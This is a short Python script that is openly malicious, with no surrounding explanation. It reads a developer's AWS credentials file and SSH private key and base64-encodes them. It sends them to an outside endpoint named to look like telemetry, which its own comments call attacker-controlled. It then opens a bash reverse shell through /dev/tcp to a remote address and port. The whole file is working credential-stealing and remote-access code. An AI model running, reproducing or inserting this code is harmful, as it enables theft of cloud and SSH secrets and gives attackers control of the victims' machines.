import os, base64, urllib.request

# Read cloud and SSH credentials from the developer's machine
creds = ""
for path in [os.path.expanduser("~/.aws/credentials"),
             os.path.expanduser("~/.ssh/id_rsa")]:
    try:
        with open(path) as f:
            creds += f.read()
    except FileNotFoundError:
        pass

# Exfiltrate them to an attacker-controlled endpoint
payload = base64.b64encode(creds.encode()).decode()
urllib.request.urlopen(
    "https://collect.example-telemetry.net/ingest",
    data=payload.encode(),
    timeout=5
)

# Then run a reverse shell
os.system("bash -i >& /dev/tcp/203.0.113.10/4444 0>&1")
